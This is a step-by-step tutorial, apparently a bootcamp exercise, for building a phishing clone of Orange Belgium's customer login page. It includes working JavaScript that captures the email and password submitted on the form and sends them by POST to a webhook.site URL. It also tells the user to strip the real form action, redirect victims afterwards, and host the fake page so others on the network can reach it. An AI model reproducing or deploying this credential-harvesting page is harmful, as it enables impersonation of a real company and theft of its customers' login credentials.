# Simulate the Orange Customer Connexion Webpage

## 1) Get the source code of the page

- Go to : https://www.orange.be/fr/e-services/login
- ctrl + s or right click and "save as"

## 2) Get a webhook

- Go to : webhook.site
- Copy the url (you gonna need it soon)

## 3) Write a script to return info to webhook

- open a new JS file here ´data.JS´
- write this script (and use the url of the webhook)

>  let myForm = document.getElementById('sso-form');  // "let name" create a variable and then we put in it the content of an id. Here id of the form
>  let formEmail = document.getElementById('sso-email'); // id of the mail input
>  let formPassword = document.getElementById('sso-password');// id of the password input
>  
>  myForm.addEventListener('submit', (e) => { // we wait for specific moment to run, here it's the submit button
>    e.preventDefault();
>   fetch('https://webhook.site/ccbd4eb0-f4b0-48c0-96da-4a96ab73004c', { //when it's in action the script fetch the data and return it to the web hook url
>       method: "POST",
>        body: JSON.stringify({ //this line transform the data we collect (who's in json format) and transform it into strings
>            username: formEmail.value, //here we say to stock those string into the variable we have creat on the top
>            password: formPassword.value
>        })
>    }).then(window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley"); // after all of this the user is redirected to this URL
>  })
>
> ![](https://github.com/Mahgnislaw/BecodeProjects/blob/main/2_The%20hill/Phishing/Phising%20Site/Orange/img/data.js.png)


## 4) Make some change on the HTML 

- remove this part from sso-form :
>  action="https://sso.orange.be/auth/sm/login.fcc" data-soho-check="/e-services/userCheck/b2b" data-soho-target="https://e-services.business.orange.be/fr/espace-client-soho/?fromB2C=true">

- On the bottom of the form put your script link

 ![](https://github.com/Mahgnislaw/BecodeProjects/blob/main/2_The%20hill/Phishing/Phising%20Site/Orange/img/callScript.png)
 
 ![](https://github.com/Mahgnislaw/BecodeProjects/blob/main/2_The%20hill/Phishing/Phising%20Site/Orange/img/CallScriptPosition.png)



-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Normaly it should work localy**

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


## Make a local server to host it

- Dont forget to rename your webpage into index.html
- on your folder open the terminal and write this command to launch a python server `py -m http.server` (the default port is 8000)
- You can acces your webpage with localhost:8000
- Other person on the same network can have acces to id with yourIP:8000


**Eazy Peazy Lemon Squezzy**
**RESULT**

On fake Orange
![](https://github.com/Mahgnislaw/BecodeProjects/blob/main/2_The%20hill/Phishing/Phising%20Site/Orange/img/orangeCO.png)

On webhook
![](https://github.com/Mahgnislaw/BecodeProjects/blob/main/2_The%20hill/Phishing/Phising%20Site/Orange/img/webhookResult.png)


